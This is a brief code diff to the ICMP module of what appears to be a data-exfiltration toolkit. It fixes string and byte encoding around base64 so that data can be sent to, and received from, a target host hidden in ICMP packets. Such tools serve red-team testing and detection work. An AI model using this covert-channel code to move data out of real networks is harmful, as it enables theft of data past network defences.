@@ -33,6 +33,7 @@ def send(data):
         target = choice(targets)
     else:
         target = config['target']
+    data = data.encode()
     data = base64.b64encode(data)
     app_exfiltrate.log_message(
         'info', "[icmp] Sending {0} bytes with ICMP packet to {1}".format(len(data), target))
@@ -65,7 +66,7 @@ def analyze(payload, src, dst):
     try:
         app_exfiltrate.log_message(
             'info', "[icmp] Received ICMP packet from {0} to {1}".format(src, dst))
-        app_exfiltrate.retrieve_data(base64.b64decode(payload))
+        app_exfiltrate.retrieve_data(base64.b64decode(payload).decode())
     except:
         pass
 
